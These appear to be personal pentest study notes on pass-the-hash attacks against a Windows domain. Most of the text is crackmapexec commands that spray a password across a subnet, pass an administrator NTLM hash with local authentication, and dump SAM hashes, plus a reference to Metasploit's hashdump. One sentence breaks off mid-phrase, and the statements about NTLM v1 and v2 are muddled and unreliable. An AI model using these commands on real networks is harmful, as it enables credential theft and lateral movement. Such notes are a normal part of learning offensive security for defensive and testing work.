What if we got the SAM hashes for the account.
	one way we can crack the hash, if the password was weak. but the other way we can pass the hash to accounts

#Tools Crackmapexec:
`crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1`

if we are on metasploit with the machine session.
`hashdump` - to collect the 


CrackmapExec:
Pass the hash will works with NTLM v1
relay only will works at - NTLM v2

`crackmapexec smb 192.168.138.0/24 -u administrator -H *HASH* --local-auth`

while we passing the hash to other admin accounts, if it gets a successful login. it will get us a all SAM hashes for machines below .

`crackmapexec smb 192.168.138.0/24 -u administrator -H *HASH* --local-auth --sam` - pull all the hashes

